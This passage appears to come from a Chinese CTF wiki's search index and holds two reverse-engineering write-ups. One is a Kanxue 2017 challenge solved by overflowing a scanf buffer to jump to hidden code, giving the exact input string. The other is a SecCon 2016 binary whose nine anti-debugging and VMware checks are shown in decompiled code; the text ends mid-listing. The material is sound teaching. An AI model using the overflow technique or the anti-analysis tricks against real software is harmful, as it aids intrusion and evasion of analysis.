            "text": "\u8fd9\u91cc\u4ee5 \u770b\u96ea.TSRC 2017CTF\u79cb\u5b63\u8d5b \u7b2c\u4e8c\u9898\u4f5c\u4e3a\u8bb2\u89e3. \u9898\u76ee\u4e0b\u8f7d\u94fe\u63a5:  ctf2017_Fpc.exe  \u7a0b\u5e8f\u5199\u4e86\u51e0\u4e2a\u51fd\u6570\u6df7\u6dc6\u89c6\u542c, \u5c06\u5173\u952e\u7684\u9a8c\u8bc1\u903b\u8f91\u52a0\u82b1\u6307\u4ee4\u9632\u6b62\u4e86IDA\u7684\u9759\u6001\u5206\u6790. \u6211\u4eec\u7528IDA\u6253\u5f00Fpc\u8fd9\u9053\u9898, \u7a0b\u5e8f\u4f1a\u5148\u6253\u5370\u4e00\u4e9b\u63d0\u793a\u4fe1\u606f, \u7136\u540e\u83b7\u53d6\u7528\u6237\u7684\u8f93\u5165.   \u8fd9\u91cc\u4f7f\u7528\u4e86\u4e0d\u5b89\u5168\u7684 scanf \u51fd\u6570, \u7528\u6237\u8f93\u5165\u7684\u7f13\u51b2\u533a\u53ea\u6709 0xCh \u957f, \u6211\u4eec\u53cc\u51fb v1 \u8fdb\u5165\u6808\u5e27\u89c6\u56fe   \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6ea2\u51fa\u6570\u636e, \u8986\u76d6\u6389\u8fd4\u56de\u5730\u5740, \u4ece\u800c\u8f6c\u79fb\u5230\u4efb\u610f\u5730\u5740\u7ee7\u7eed\u6267\u884c.   \u8fd9\u91cc\u6211\u8fd8\u9700\u8981\u89e3\u91ca\u4e00\u4e0b, \u5c31\u662f scanf \u4e4b\u524d\u5199\u7684\u51e0\u4e2a\u6df7\u6dc6\u89c6\u542c\u7684\u51fd\u6570, \u662f\u4e00\u4e9b\u7b80\u5355\u7684\u65b9\u7a0b\u5f0f\u4f46\u5b9e\u9645\u4e0a\u662f\u65e0\u89e3\u7684. \u7a0b\u5e8f\u5c06\u771f\u6b63\u7684\u9a8c\u8bc1\u903b\u8f91\u52a0\u82b1\u6df7\u6dc6, \u5bfc\u81f4IDA\u65e0\u6cd5\u5f88\u597d\u7684\u8fdb\u884c\u53cd\u7f16\u8bd1. \u6240\u4ee5\u6211\u4eec\u8fd9\u9053\u9898\u7684\u601d\u8def\u5c31\u662f, \u901a\u8fc7\u6ea2\u51fa\u8f6c\u5230\u771f\u6b63\u7684\u9a8c\u8bc1\u4ee3\u7801\u5904\u7ee7\u7eed\u6267\u884c.   \u6211\u4eec\u5728\u5206\u6790\u65f6\u53ef\u4ee5\u5728\u4ee3\u7801\u4e0d\u8fdc\u5904\u53d1\u73b0\u4ee5\u4e0b\u6570\u636e\u5757.   \u56e0\u4e3aIDA\u6ca1\u80fd\u5f88\u597d\u7684\u8bc6\u522b\u6570\u636e, \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5c06\u5149\u6807\u79fb\u5230\u6570\u636e\u5757\u7684\u8d77\u59cb\u4f4d\u7f6e, \u7136\u540e\u6309\u4e0b C \u952e(code)\u5c06\u8fd9\u5757\u6570\u636e\u53cd\u6c47\u7f16\u6210\u4ee3\u7801   \u503c\u5f97\u6ce8\u610f\u7684\u662f, \u8fd9\u6bb5\u4ee3\u7801\u7684\u4f4d\u7f6e\u662f 0x00413131 ,  0x41 \u662f 'A' \u7684ascii\u7801\uff0c\u800c 0x31 \u662f '1' \u7684ascii\u7801. \u7531\u4e8e\u770b\u96ea\u6bd4\u8d5b\u7684\u9650\u5236, \u7528\u6237\u8f93\u5165\u53ea\u80fd\u662f\u5b57\u6bcd\u548c\u6570\u5b57, \u6240\u4ee5\u6211\u4eec\u4e5f\u5b8c\u5168\u53ef\u4ee5\u5229\u7528\u6ea2\u51fa\u6f0f\u6d1e\u6267\u884c\u8fd9\u6bb5\u4ee3\u7801  \u7528OD\u6253\u5f00, \u7136\u540e Ctrl+G \u5230\u8fbe 0x413131 \u5904\u8bbe\u4e0b\u65ad\u70b9, \u8fd0\u884c\u540e\u8f93\u5165 12345612345611A \u56de\u8f66, \u7a0b\u5e8f\u6210\u529f\u5730\u5230\u8fbe 0x00413131 \u5904. \u7136\u540e \u53f3\u952e\u5206\u6790- \u4ece\u6a21\u5757\u4e2d\u5220\u9664\u5206\u6790 \u8bc6\u522b\u51fa\u6b63\u786e\u4ee3\u7801   \u65ad\u5728 0x413131 \u5904\u540e, \u70b9\u51fb\u83dc\u5355\u680f\u7684 \u67e5\u770b , \u9009\u62e9 RUN\u8ddf\u8e2a , \u7136\u540e\u518d\u70b9\u51fb \u8c03\u8bd5 , \u9009\u62e9 \u8ddf\u8e2a\u6b65\u5165 , \u7a0b\u5e8f\u4f1a\u8bb0\u5f55\u8fd9\u6bb5\u82b1\u6307\u4ee4\u6267\u884c\u7684\u8fc7\u7a0b, \u5982\u4e0b\u56fe\u6240\u793a:   \u8fd9\u6bb5\u82b1\u6307\u4ee4\u672c\u6765\u5f88\u957f, \u4f46\u662f\u4f7f\u7528OD\u7684\u8ddf\u8e2a\u529f\u80fd\u540e, \u82b1\u6307\u4ee4\u7684\u6267\u884c\u6d41\u7a0b\u5c31\u975e\u5e38\u6e05\u695a. \u6574\u4e2a\u8fc7\u7a0b\u4e2d\u8fdb\u884c\u4e86\u5927\u91cf\u7684\u8df3\u8f6c, \u6211\u4eec\u53ea\u8981\u53d6\u5176\u4e2d\u7684\u6709\u6548\u6307\u4ee4\u62ff\u51fa\u6765\u5206\u6790\u5373\u53ef.  \u9700\u8981\u6ce8\u610f\u7684\u662f, \u5728\u6709\u6548\u6307\u4ee4\u4e2d, \u6211\u4eec\u4f9d\u65e7\u8981\u6ee1\u8db3\u4e00\u4e9b\u6761\u4ef6\u8df3\u8f6c, \u8fd9\u6837\u7a0b\u5e8f\u624d\u80fd\u5728\u6b63\u786e\u7684\u903b\u8f91\u4e0a\u4e00\u76f4\u6267\u884c\u4e0b\u53bb.   \u6bd4\u5982 0x413420 \u5904\u7684 jnz ctf2017_.00413B03 . \u6211\u4eec\u5c31\u8981\u91cd\u65b0\u6765\u8fc7, \u5e76\u5728 0x413420 \u8bbe\u4e0b\u65ad\u70b9   \u901a\u8fc7\u4fee\u6539\u6807\u5fd7\u5bc4\u5b58\u5668\u6765\u6ee1\u8db3\u8df3\u8f6c. \u7ee7\u7eed\u8ddf\u8e2a\u6b65\u5165(\u4e4b\u540e\u8fd8\u6709 0041362E  jnz ctf2017_.00413B03 \u9700\u8981\u6ee1\u8db3). \u4fdd\u8bc1\u903b\u8f91\u6b63\u786e\u540e, \u5c06\u6709\u6548\u6307\u4ee4\u53d6\u51fa\u7ee7\u7eed\u5206\u6790\u5c31\u597d\u4e86", 
            "title": "\u4f8b\u9898"
        }, 
        {
            "location": "/reverse/anti-debug/example/", 
            "text": "\u6211\u4eec\u73b0\u5728\u6765\u5206\u6790\u4e00\u90532016\u5e74SecCon\u7684\nanti-debugging\n\u9898, \u9898\u76ee\u4e0b\u8f7d\u94fe\u63a5: \nbin.exe\n\n\n\u8fd9\u662f\u4e00\u4e2a32\u4f4d\u7684PE\u6587\u4ef6, \u662f\u4e00\u4e2a\u63a7\u5236\u53f0\u7a0b\u5e8f, \u6211\u4eec\u76f4\u63a5\u8fd0\u884c, \u4f1a\u8981\u6c42\u8f93\u5165\npassword\n. \u5f53\u4f60\u8f93\u5165\u4e00\u4e2a\u9519\u8bef\u7684\npassword\n\u65f6\u5219\u4f1a\u63d0\u793a\u4f60\npassword is wrong\n.\n\n\n\n\n\u6211\u4eec\u7528IDA\u6253\u5f00\u6765\u770b\u4e0b, \u6700\u5feb\u901f\u7684\u65b9\u5f0f\u5c31\u662f\u76f4\u63a5\u67e5\u770b\u5b57\u7b26\u4e32, \u6839\u636e\npassword is wrong\n\u627e\u5230\u5173\u952e\u4ee3\u7801. IDA\u663e\u793a\u7684\u7ed3\u679c\u5982\u4e0b\u56fe:\n\n\n\n\n\u663e\u7136, \u5b57\u7b26\u4e32\u8868\u660e\u7a0b\u5e8f\u4e2d\u53ef\u80fd\u6709\u5404\u79cd\u68c0\u6d4b, \u6bd4\u5982\u68c0\u6d4b\u8fdb\u7a0b\u540d\nollydbg.exe\n, \nImmunityDebugger.exe\n, \nidaq.exe\n\u548c\nWireshark.exe\n. \u7136\u540e\u4e5f\u6709\u5176\u4ed6\u7684\u68c0\u6d4b. \u6211\u4eec\u4e5f\u770b\u5230\u4e86\u5b57\u7b26\u4e32\npassword is wrong\n\u548c\nYou password is correct\n\u7684\u5b57\u6837. \u540c\u65f6\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2a\u5f88\u6709\u53ef\u80fd\u5c31\u662f\u5f85\u89e3\u5bc6\u7684flag\u7684\u5b57\u7b26\u4e32. \u90a3\u4e48\u6211\u4eec\u5c31\u5148\u6839\u636e\npassword is wrong\n\u7684\u4ea4\u53c9\u5f15\u7528\u6765\u5230\u5173\u952e\u51fd\u6570\u5904. \n\n\n\u5982\u4e0b\u6240\u793a: \u7a0b\u5e8f\u679c\u7136\u4f7f\u7528\u4e86\u5927\u91cf\u7684\u53cd\u8c03\u8bd5\u6280\u5de7.\n\n\nint\n \n__cdecl\n \nmain\n(\nint\n \nargc\n,\n \nconst\n \nchar\n \n**\nargv\n,\n \nconst\n \nchar\n \n**\nenvp\n)\n\n\n{\n\n  \nv23\n \n=\n \n0\n;\n\n  \nmemset\n(\nv24\n,\n \n0\n,\n \n0x3Fu\n);\n\n  \nv22\n \n=\n \n1\n;\n\n  \nprintf\n(\nInput password \n);\n\n  \nv3\n \n=\n \n(\nFILE\n \n*\n)\nsub_40223D\n();\n\n  \nfgets\n(\nv23\n,\n \n64\n,\n \nv3\n);\n\n  \nstrcpy\n(\nv21\n,\n \nI have a pen.\n);\n  \n  \nv22\n \n=\n \nstrncmp\n(\nv23\n,\n \nv21\n,\n \n0xDu\n);\n \n// 1. \u76f4\u63a5\u6bd4\u8f83\u660e\u6587\u5b57\u7b26\u4e32\u4e0e\u8f93\u5165\u5b57\u7b26\u4e32\n\n  \nif\n \n(\n \n!\nv22\n \n)\n   \n  \n{\n\n    \nputs\n(\nYour password is correct.\n);\n\n    \nif\n \n(\n \nIsDebuggerPresent\n()\n \n==\n \n1\n \n)\n     \n// 2. API: IsDebuggerPresent()\n\n    \n{\n\n      \nputs\n(\nBut detected debugger!\n);\n\n      \nexit\n(\n1\n);\n\n    \n}\n\n    \nif\n \n(\n \nsub_401120\n()\n \n==\n \n0x70\n \n)\n         \n// 3. \u68c0\u6d4bPEB\u76840x68\u504f\u79fb\u5904\u662f\u5426\u4e3a0x70. \u68c0\u6d4bNtGlobalFlag()\n\n    \n{\n\n      \nputs\n(\nBut detected NtGlobalFlag!\n);\n\n      \nexit\n(\n1\n);\n\n    \n}\n\n\n    \n/*  BOOL WINAPI CheckRemoteDebuggerPresent(\n\n\n     *    _In_    HANDLE hProcess,\n\n\n     *    _Inout_ PBOOL  pbDebuggerPresent\n\n\n     *  );\n\n\n     */\n\n    \nv4\n \n=\n \nGetCurrentProcess\n();\n\n    \nCheckRemoteDebuggerPresent\n(\nv4\n,\n \npbDebuggerPresent\n);\n\n    \nif\n \n(\n \npbDebuggerPresent\n \n)\n            \n// 4. API: CheckRemoteDebuggerPresent()\n\n    \n{\n\n      \nprintf\n(\nBut detected remotedebug.\n\\n\n);\n\n      \nexit\n(\n1\n);\n\n    \n}\n\n    \nv13\n \n=\n \nGetTickCount\n();\n\n    \nfor\n \n(\n \ni\n \n=\n \n0\n;\n \ni\n \n==\n \n100\n;\n \n++\ni\n \n)\n\n      \nSleep\n(\n1u\n);\n\n    \nv16\n \n=\n \n1000\n;\n\n    \nif\n \n(\n \nGetTickCount\n()\n \n-\n \nv13\n \n \n1000\n \n)\n  \n// 5. \u68c0\u6d4b\u65f6\u95f4\u5dee\n\n    \n{\n\n      \nprintf\n(\nBut detected debug.\n\\n\n);\n\n      \nexit\n(\n1\n);\n\n    \n}\n\n    \nlpFileName\n \n=\n \n\\\\\\\\\n.\n\\\\\nGlobal\n\\\\\nProcmonDebugLogger\n;\n\n    \nif\n \n(\n \nCreateFileA\n(\n\\\\\\\\\n.\n\\\\\nGlobal\n\\\\\nProcmonDebugLogger\n,\n \n0x80000000\n,\n \n7u\n,\n \n0\n,\n \n3u\n,\n \n0x80u\n,\n \n0\n)\n \n!=\n \n(\nHANDLE\n)\n-\n1\n \n)\n\n    \n{\n\n      \nprintf\n(\nBut detect %s.\n\\n\n,\n \nlpFileName\n);\n      \n// 6. \u68c0\u6d4bProcessMonitor\n\n      \nexit\n(\n1\n);\n\n    \n}\n\n    \nv11\n \n=\n \nsub_401130\n();\n     \n// 7. API: CreateToolhelp32Snapshot()\u68c0\u6d4b\u8fdb\u7a0b \n\n    \nif\n \n(\n \nv11\n \n==\n \n1\n \n)\n\n    \n{\n\n      \nprintf\n(\nBut detected Ollydbg.\n\\n\n);\n\n      \nexit\n(\n1\n);\n\n    \n}\n\n    \nif\n \n(\n \nv11\n \n==\n \n2\n \n)\n\n    \n{\n\n      \nprintf\n(\nBut detected ImmunityDebugger.\n\\n\n);\n\n      \nexit\n(\n1\n);\n\n    \n}\n\n    \nif\n \n(\n \nv11\n \n==\n \n3\n \n)\n\n    \n{\n\n      \nprintf\n(\nBut detected IDA.\n\\n\n);\n\n      \nexit\n(\n1\n);\n\n    \n}\n\n    \nif\n \n(\n \nv11\n \n==\n \n4\n \n)\n\n    \n{\n\n      \nprintf\n(\nBut detected WireShark.\n\\n\n);\n\n      \nexit\n(\n1\n);\n\n    \n}\n\n    \nif\n \n(\n \nsub_401240\n()\n \n==\n \n1\n \n)\n    \n// 8. \u901a\u8fc7vmware\u7684I/O\u7aef\u53e3\u8fdb\u884c\u68c0\u6d4b\n\n    \n{\n\n      \nprintf\n(\nBut detected VMware.\n\\n\n);\n\n      \nexit\n(\n1\n);\n\n    \n}\n\n    \nv17\n \n=\n \n1\n;\n    \n    \nv20\n \n=\n \n1\n;\n\n    \nv12\n \n=\n \n0\n;\n\n    \nv19\n \n=\n \n1\n \n/\n \n0\n;\n   \n    \nms_exc\n.\nregistration\n.\nTryLevel\n \n=\n \n-\n2\n;\n  \n// 9. SEH\n\n    \nprintf\n(\nBut detected Debugged.\n\\n\n);\n\n    \nexit\n(\n1\n);\n\n  \n}\n\n  \nprintf\n(\npassword is wrong.\n\\n\n);\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u6211\u5728\u4ee3\u7801\u91cc\u5199\u4e86\u6ce8\u91ca, \u5217\u51fa\u4e86\u5176\u4e2d\u6240\u4f7f\u7528\u76849\u4e2a\u4fdd\u62a4\u6280\u672f\u90e8\u5206. \u6211\u4eec\u6765\u9010\u4e00\u5206\u6790\u4e00\u4e0b\u5427.\n\n\n\u6bd4\u8f83\u660e\u6587\u5b57\u7b26\u4e32\n\n\nprintf\n(\nInput password \n);\n\n\nv3\n \n=\n \n(\nFILE\n \n*\n)\nsub_40223D\n();\n\n\nfgets\n(\nv23\n,\n \n64\n,\n \nv3\n);\n\n\nstrcpy\n(\nv21\n,\n \nI have a pen.\n);\n  \n\nv22\n \n=\n \nstrncmp\n(\nv23\n,\n \nv21\n,\n \n0xDu\n);\n \n// 1. \u76f4\u63a5\u6bd4\u8f83\u660e\u6587\u5b57\u7b26\u4e32\u4e0e\u8f93\u5165\u5b57\u7b26\u4e32\n\n\nif\n \n(\n \n!\nv22\n \n)\n  \n{\n\n    \n......\n\n\n}\n\n\n\n\n\n\u8fd9\u91cc\u5c31\u662f\u8f93\u51fa\nInput password \n. \u7136\u540e\u7528\nfgets()\n\u83b7\u53d6\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u4e32, \u5c06\nI have a pen.\n\u590d\u5236\u5230\nv21\n\u7684\u7f13\u51b2\u533a\u4e2d, \u7136\u540e\u7528\nstrncmp\n\u6bd4\u5bf9\u7528\u6237\u8f93\u5165\u4e0e\nI have a pen.\n\u7684\u5185\u5bb9, \u5e76\u5c06\u6bd4\u8f83\u7ed3\u679c\u8fd4\u56de\u7ed9\nv22\n. \u4ee5\u4e0b\u4f1a\u6839\u636e\nv22\n, \u4e5f\u5c31\u662f\u6839\u636e\u8f93\u5165\u7684\npassword\n\u662f\u5426\u6b63\u786e, \u800c\u8fdb\u884c\u8df3\u8f6c.\n\n\nIsDebuggerPresent()\n\n\nputs\n(\nYour password is correct.\n);\n\n\nif\n \n(\n \nIsDebuggerPresent\n()\n \n==\n \n1\n \n)\n     \n// 2. API: IsDebuggerPresent()\n\n\n{\n\n    \nputs\n(\nBut detected debugger!\n);\n\n    \nexit\n(\n1\n);\n\n\n}\n\n\n\n\n\n\u663e\u7136, \u8f93\u5165\u7684\npassword\n\u6b63\u786e, \u5c31\u4f1a\u8f93\u51fa\u63d0\u793a\nYour password is correct.\n. ??? \u4e0d\u89c9\u5f97\u5947\u602a\u5417. \u96be\u9053\nI have a pen.\n\u5c31\u662f\u6211\u4eec\u7684flag\u4e86\u5417? \u4e0d\u4e0d\u4e0d\u5f53\u7136\u4e0d\u662f. \u8fd9\u5176\u5b9e\u662f\u4e00\u4e2a\u9677\u9631, \u65e2\u7136\u4f60\u77e5\u9053\u4e86\nI have a pen.\n\u90a3\u4e48\u5c31\u80af\u5b9a\u6709\u901a\u8fc7\u67d0\u79cd\u9006\u5411\u624b\u6bb5\u5728\u5bf9\u7a0b\u5e8f\u8fdb\u884c\u5206\u6790. \u6240\u4ee5\u63a5\u4e0b\u6765\u7684\u90e8\u5206\u5c31\u5f00\u59cb\u8fdb\u884c\u4e00\u4e9b\u53cd\u8c03\u8bd5\u6216\u5176\u4ed6\u7684\u68c0\u6d4b\u624b\u6bb5(\u5b9e\u9645\u4e2d\u4e5f\u53ef\u4ee5\u51fa\u73b0\u8fd9\u6837\u7684\u9677\u9631).\n\n\n\u4e00\u5f00\u59cb\u7684\u662f\nIsDebuggerPresent()\n, \u6839\u636e\u8fd4\u56de\u7ed3\u679c\u5224\u65ad\u662f\u5426\u5b58\u5728\u8c03\u8bd5.\u5982\u679c\u4e0d\u592a\u6e05\u695a\u7684\u8bdd, \u53ef\u4ee5\u8fd4\u56de\u53bb\u770b \nIsDebuggerPresent()\n \u7bc7\n\n\nNtGlobalFlag\n\n\n\u63a5\u4e0b\u6765\u662f\u68c0\u6d4b\nNtGlobalFlag\n\u8fd9\u4e2a\u5b57\u6bb5\u7684\u6807\u5fd7\u4f4d. \u901a\u8fc7\u68c0\u6d4bPEB\u7684\u5b57\u6bb5\u503c\u662f\u5426\u4e3a\n0x70\n\u6765\u68c0\u6d4b\u8c03\u8bd5\u5668, \u5982\u679c\u4e0d\u592a\u6e05\u695a\u7684\u8bdd, \u53ef\u4ee5\u8fd4\u56de\u53bb\u770b \nNtGlobalFlag\n \u7bc7\n\n\nif\n \n(\n \nsub_401120\n()\n \n==\n \n0x70\n \n)\n         \n// 3. \u68c0\u6d4bPEB\u76840x68\u504f\u79fb\u5904\u662f\u5426\u4e3a0x70. \u68c0\u6d4bNtGlobalFlag()\n\n\n{\n\n    \nputs\n(\nBut detected NtGlobalFlag!\n);\n\n    \nexit\n(\n1\n);\n\n\n}\n\n\n\n\n\n\u90a3\u6211\u4eec\u6765\u7b80\u5355\u770b\u4e00\u4e0b\nsub_401120()\n\u597d\u4e86\n\n\nint\n \nsub_401120\n()\n\n\n{\n\n  \nreturn\n \n*\n(\n_DWORD\n \n*\n)(\n__readfsdword\n(\n48\n)\n \n+\n \n0x68\n)\n \n \n0x70\n;\n\n\n}\n\n\n\n\n\n0x68\n\u662fPEB\u7684\nNtGlobalFlag\n\u5b57\u6bb5\u5bf9\u5e94\u504f\u79fb\u503c. \n0x70\n\u662f\nFLG_HEAP_ENABLE_TAIL_CHECK (0x10)\n, \nFLG_HEAP_ENABLE_FREE_CHECK (0x20)\n \u548c\nFLG_HEAP_VALIDATE_PARAMETERS (0x40)\n\u8fd9\u4e09\u4e2a\u6807\u5fd7\n\n\nCheckRemoteDebuggerPresent\n\n\n/*  BOOL WINAPI CheckRemoteDebuggerPresent(\n\n\n *    _In_    HANDLE hProcess,\n\n\n *    _Inout_ PBOOL  pbDebuggerPresent\n\n\n *  );\n\n\n */\n\n\nv4\n \n=\n \nGetCurrentProcess\n();\n\n\nCheckRemoteDebuggerPresent\n(\nv4\n,\n \npbDebuggerPresent\n);\n\n\nif\n \n(\n \npbDebuggerPresent\n \n)\n            \n// 4. API: CheckRemoteDebuggerPresent()\n\n\n{\n\n    \nprintf\n(\nBut detected remotedebug.\n\\n\n);\n\n    \nexit\n(\n1\n);\n\n\n}\n\n\n\n\u8fd9\u91cc\u6211\u987a\u4fbf\u5728\u6ce8\u91ca\u91cc\u5217\u51fa\u4e86\nCheckRemoteDebuggerPresent()\n\u8fd9\u4e2aAPI\u7684\u51fd\u6570\u539f\u578b. \u5982\u679c\u68c0\u6d4b\u5230\u8c03\u8bd5\u5668\u7684\u5b58\u5728, \u4f1a\u5c06\npbDebuggerPresent\n\u8bbe\u7f6e\u4e3a\u4e00\u4e2a\u975e\u96f6\u503c. \u6839\u636e\u5176\u503c\u68c0\u6d4b\u8c03\u8bd5\u5668(\nCheckRemoteDebuggerPresent()\n \u7bc7)\n\n\n\u65f6\u95f4\u5dee\u68c0\u6d4b\n\n\nv13\n \n=\n \nGetTickCount\n();\n\n\nfor\n \n(\n \ni\n \n=\n \n0\n;\n \ni\n \n==\n \n100\n;\n \n++\ni\n \n)\n    \n// \u7761\u7720\n\n    \nSleep\n(\n1u\n);\n\n\nv16\n \n=\n \n1000\n;\n\n\nif\n \n(\n \nGetTickCount\n()\n \n-\n \nv13\n \n \n1000\n \n)\n  \n// 5. \u68c0\u6d4b\u65f6\u95f4\u5dee\n\n\n{\n\n    \nprintf\n(\nBut detected debug.\n\\n\n);\n\n    \nexit\n(\n1\n);\n\n\n}\n\n\n\n\n\nGetTickCount\n\u4f1a\u8fd4\u56de\u542f\u52a8\u5230\u73b0\u5728\u7684\u6beb\u79d2\u6570, \u5faa\u73af\u91cc\u5149\u662f\nsleep(1)\n\u5c31\u8fdb\u884c\u4e86100\u6b21, \u4e5f\u5c31\u662f100\u6beb\u79d2. \u4e24\u6b21\u5f97\u5230\u7684\u65f6\u95f4\u4f5c\u5dee\u5982\u679c\u5927\u4e8e1000\u6beb\u79d2, \u65f6\u5dee\u660e\u663e\u5927\u4e8e\u6240\u8017\u7684\u65f6\u95f4, \u4e5f\u5c31\u95f4\u63a5\u68c0\u6d4b\u5230\u4e86\u8c03\u8bd5. \n\n\nProcessMonitor\n\n\nlpFileName\n \n=\n \n\\\\\\\\\n.\n\\\\\nGlobal\n\\\\\nProcmonDebugLogger\n;\n\n\nif\n \n(\n \nCreateFileA\n(\n\\\\\\\\\n.\n\\\\\nGlobal\n\\\\\nProcmonDebugLogger\n,\n \n0x80000000\n,\n \n7u\n,\n \n0\n,\n \n3u\n,\n \n0x80u\n,\n \n0\n)\n \n!=\n \n(\nHANDLE\n)\n-\n1\n \n)\n\n\n{\n\n    \nprintf\n(\nBut detect %s.\n\\n\n,\n \nlpFileName\n);\n      \n// 6. \u68c0\u6d4bProcessMonitor\n\n    \nexit\n(\n1\n);\n\n\n}\n\n\n\n\n\n\u8fd9\u91cc\u901a\u8fc7\u68c0\u6d4b\u8bbe\u5907\u6587\u4ef6\n\\\\\\\\.\\\\Global\\\\ProcmonDebugLogger\n\u6765\u68c0\u6d4b\nProcessMonitor\n\n\n\u68c0\u6d4b\u8fdb\u7a0b\u540d\n\n\n\u8fd9\u91cc\u901a\u8fc7\u6267\u884c\nsub_401130()\n\u51fd\u6570\u6765\u68c0\u6d4b\u8fdb\u7a0b, \u5e76\u6839\u636e\u68c0\u6d4b\u5230\u7684\u4e0d\u540c\u8fdb\u7a0b, \u8fd4\u56de\u76f8\u5e94\u7684\u503c. \n\n\nv11\n \n=\n \nsub_401130\n();\n     \n// 7. API: CreateToolhelp32Snapshot()\u68c0\u6d4b\u8fdb\u7a0b \n\n\nif\n \n(\n \nv11\n \n==\n \n1\n \n)\n\n\n{\n\n    \nprintf\n(\nBut detected Ollydbg.\n\\n\n);\n\n    \nexit\n(\n1\n);\n\n\n}\n\n\nif\n \n(\n \nv11\n \n==\n \n2\n \n)\n\n\n{\n\n    \nprintf\n(\nBut detected ImmunityDebugger.\n\\n\n);\n\n    \nexit\n(\n1\n);\n\n\n}\n\n\nif\n \n(\n \nv11\n \n==\n \n3\n \n)\n\n\n{\n\n    \nprintf\n(\nBut detected IDA.\n\\n\n);\n\n    \nexit\n(\n1\n);\n\n\n}\n\n\nif\n \n(\n \nv11\n \n==\n \n4\n \n)\n\n\n{\n\n    \nprintf\n(\nBut detected WireShark.\n\\n\n);\n\n    \nexit\n(\n1\n);\n\n\n}\n\n\n\n\n\n\u6211\u4eec\u5c31\u6765\u770b\u4e00\u4e0b\nsub_401130()\n\u51fd\u6570\n\n\nsigned\n \nint\n \nsub_401130\n()\n\n\n{\n\n  \nPROCESSENTRY32\n \npe\n;\n \n// [sp+0h] [bp-138h]@1\n\n  \nHANDLE\n \nhSnapshot\n;\n \n// [sp+130h] [bp-8h]@1\n\n  \nint\n \ni\n;\n \n// [sp+134h] [bp-4h]@1\n\n\n  \npe\n.\ndwSize\n \n=\n \n296\n;\n\n  \nmemset\n(\npe\n.\ncntUsage\n,\n \n0\n,\n \n0x124u\n);\n\n  \nhSnapshot\n \n=\n \nCreateToolhelp32Snapshot\n(\n2u\n,\n \n0\n);\n\n  \nfor\n \n(\n \ni\n \n=\n \nProcess32First\n(\nhSnapshot\n,\n \npe\n);\n \ni\n \n==\n \n1\n;\n \ni\n \n=\n \nProcess32Next\n(\nhSnapshot\n,\n \npe\n)\n \n)\n\n  \n{\n\n    \nif\n \n(\n \n!\n_stricmp\n(\npe\n.\nszExeFile\n,\n \nollydbg.exe\n)\n \n)\n\n      \nreturn\n \n1\n;\n\n    \nif\n \n(\n \n!\n_stricmp\n(\npe\n.\nszExeFile\n,\n \nImmunityDebugger.exe\n)\n \n)\n\n      \nreturn\n \n2\n;\n\n    \nif\n \n(\n \n!\n_stricmp\n(\npe\n.\nszExeFile\n,\n \nidaq.exe\n)\n \n)\n\n      \nreturn\n \n3\n;\n\n    \nif\n \n(\n \n!\n_stricmp\n(\npe\n.\nszExeFile\n,\n \nWireshark.exe\n)\n \n)\n\n      \nreturn\n \n4\n;\n\n  \n}\n\n  \nreturn\n \n0\n;\n\n\n}\n\n\n\n\n\n\u8fd9\u91cc\u4f7f\u7528\u4e86API: \nCreateToolhelp32Snapshot\n\u6765\u83b7\u53d6\u5f53\u524d\u7684\u8fdb\u7a0b\u4fe1\u606f. \u5e76\u5728for\u5faa\u73af\u91cc\u4f9d\u6b21\u6bd4\u5bf9. \u5982\u679c\u627e\u5230\u6307\u5b9a\u7684\u8fdb\u7a0b\u540d, \u5c31\u76f4\u63a5\u8fd4\u56de\u76f8\u5e94\u7684\u503c. \u7136\u540e\u6839\u636e\u8fd4\u56de\u503c\u8df3\u8f6c\u5230\u4e0d\u540c\u7684\u5206\u652f\u91cc.\n\n\n\u68c0\u6d4bVMware\n\n\n\u68c0\u6d4bVMware\u4e5f\u662f\u68c0\u6d4b\u4e00\u4e9b\u7279\u5f81. \u6839\u636e\u68c0\u6d4b\u7684\u7ed3\u679c\u8fdb\u884c\u5224\u65ad.\n\n\nif\n \n(\n \nsub_401240\n()\n \n==\n \n1\n \n)\n    \n// 8. \u901a\u8fc7vmware\u7684I/O\u7aef\u53e3\u8fdb\u884c\u68c0\u6d4b\n\n\n{\n\n    \nprintf\n(\nBut detected VMware.\n\\n\n);\n\n    \nexit\n(\n1\n);\n\n\n}\n\n\n\n\n\n\u6765\u770b\nsub_401240()\n\u51fd\u6570.\n\n\nsigned\n \nint\n \nsub_401240\n()\n\n\n{\n\n  \nunsigned\n \n__int32\n \nv0\n;\n \n// eax@1\n\n\n  \nv0\n \n=\n \n__indword\n(\n0x5658u\n);\n\n  \nreturn\n \n1\n;\n\n\n}\n\n\n\n\n\n\u8fd9\u662fVMware\u7684\u4e00\u4e2a\"\u540e\u95e8\"I/O\u7aef\u53e3, \n0x5658 = \nVX\n. \u5982\u679c\u7a0b\u5e8f\u5728VMware\u5185\u8fd0\u884c, \u7a0b\u5e8f\u4f7f\u7528\nIn\n\u6307\u4ee4\u901a\u8fc7\n0x5658\n\u7aef\u53e3\u8bfb\u53d6\u6570\u636e\u65f6, \nEBX\n\u5bc4\u5b58\u5668\u7684\u503c\u5c31\u4f1a\u53d8\u4e3a\n0x564D5868\n(\n0x564D5868 == \nVMXh\n)\n\n\n\u770bIDA\u53cd\u7f16\u8bd1\u51fa\u7684\u4f2aC\u4ee3\u7801\u5e76\u4e0d\u5f88\u76f4\u89c2\u5730\u4f53\u73b0\u8fd9\u70b9, \u6211\u4eec\u770b\u6c47\u7f16\u4ee3\u7801\u5c31\u6e05\u695a\u4e86\n\n\n.text:\n0040127\nA\n                 \npush\n    \nedx\n\n\n.text:\n0040127\nB\n                 \npush\n    \necx\n\n\n.text:\n0040127\nC\n                 \npush\n    \nebx\n\n\n.text:\n0040127\nD\n                 \nmov\n     \neax\n,\n \n564\nD5868h\n   \n//\n  \n------\n\n\n.text:\n00401282\n                 \nmov\n     \nebx\n,\n \n0\n\n\n.text:\n00401287\n                 \nmov\n     \necx\n,\n \n0\nAh\n\n\n.text:\n0040128\nC\n                 \nmov\n     \nedx\n,\n \n5658\nh\n   \n//\n  \n------\n\n\n.text:\n00401291\n                 \nin\n      \neax\n,\n \ndx\n\n\n.text:\n00401292\n                 \npop\n     \nebx\n\n\n.text:\n00401293\n                 \npop\n     \necx\n\n\n.text:\n00401294\n                 \npop\n     